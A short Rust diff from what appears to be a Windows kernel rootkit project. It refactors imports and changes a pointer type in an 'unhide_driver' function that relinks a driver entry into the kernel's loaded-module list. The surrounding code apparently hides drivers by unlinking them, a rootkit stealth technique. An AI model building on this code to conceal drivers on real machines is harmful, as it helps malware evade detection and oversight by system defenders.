@@ -2,8 +2,11 @@ use {
     obfstr::obfstr,
     common::structs::DriverInfo,
     crate::{error::ShadowError, uni}, 
-    alloc::{string::{String, ToString}, vec::Vec}, 
-    ntapi::ntldr::{LDR_DATA_TABLE_ENTRY, PLDR_DATA_TABLE_ENTRY}, 
+    alloc::{
+        vec::Vec,
+        string::{String, ToString}, 
+    }, 
+    ntapi::ntldr::LDR_DATA_TABLE_ENTRY, 
     wdk_sys::{
         ntddk::MmGetSystemRoutineAddress, 
         LIST_ENTRY, NTSTATUS, PLIST_ENTRY, 
@@ -101,7 +104,7 @@ impl Driver {
     ///
     /// * `Ok(STATUS_SUCCESS)` - If the driver is successfully restored to the list.
     /// * `Err(ShadowError)` - If an error occurs during the restoration process.
-    pub unsafe fn unhide_driver(driver_name: &str, list_entry: PLIST_ENTRY, driver_entry: PLDR_DATA_TABLE_ENTRY) -> Result<NTSTATUS, ShadowError> {
+    pub unsafe fn unhide_driver(driver_name: &str, list_entry: PLIST_ENTRY, driver_entry: *mut LDR_DATA_TABLE_ENTRY) -> Result<NTSTATUS, ShadowError> {
         // Restore the driver's link pointers
         (*driver_entry).InLoadOrderLinks.Flink = (*list_entry).Flink as *mut winapi::shared::ntdef::LIST_ENTRY;
         (*driver_entry).InLoadOrderLinks.Blink = (*list_entry).Blink as *mut winapi::shared::ntdef::LIST_ENTRY;
